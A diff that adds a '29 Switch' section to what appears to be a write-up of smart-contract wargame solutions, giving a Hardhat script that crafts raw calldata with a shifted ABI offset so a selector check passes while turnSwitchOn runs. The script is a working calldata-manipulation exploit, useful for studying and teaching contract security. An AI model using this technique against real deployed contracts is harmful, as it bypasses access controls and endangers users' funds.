@@ -1267,3 +1267,53 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 ```
+
+## 29 Switch
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("Switch")).attach("<target contract address>");
+
+  // Demonstration of calling flipSwitch with the turnSwichOff selector
+  const turnSwitchOffSelector = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("turnSwitchOff()")).toString().substring(2,10);
+  (await target.flipSwitch("0x" + turnSwitchOffSelector)).wait();
+  console.log("Successfully demonstrated flipSwitch()");
+
+  // Demonstration of calling flipSwitch with the turnSwitchOff selector using call/sendTransaction
+  const [ signer ] = await hre.ethers.getSigners();
+  const flipSwitchSelector = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("flipSwitch(bytes)")).toString().substring(2,10);
+  (await signer.sendTransaction({
+    from: signer.address,
+    to: await target.getAddress(),
+    data: "0x" + flipSwitchSelector + 
+      hre.ethers.zeroPadValue("0x20", 32).substring(2) + // Offset of data (ie arguments)
+      hre.ethers.zeroPadValue("0x04", 32).substring(2) + // Length of data
+      turnSwitchOffSelector // Data
+  })).wait();
+  console.log("Successfully demonstrated flipSwitch() using sendTransaction()");
+
+  console.log(`Switch switchOn = ${await target.switchOn()}`);
+
+  const turnSwitchOnSelector = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("turnSwitchOn()")).toString().substring(2,10);
+  (await signer.sendTransaction({
+    from: signer.address,
+    to: await target.getAddress(),
+    data: "0x" + flipSwitchSelector + 
+      hre.ethers.zeroPadValue("0x60", 32).substring(2) + // Offset of data
+      hre.ethers.zeroPadValue("0x00", 32).substring(2) +
+      turnSwitchOffSelector + hre.ethers.zeroPadValue("0x00", 28).substring(2) +
+      hre.ethers.zeroPadValue("0x04", 32).substring(2) + // Length of data
+      turnSwitchOnSelector // Data
+  })).wait();
+  console.log("Attack complete");
+
+  console.log(`Switch switchOn = ${await target.switchOn()}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
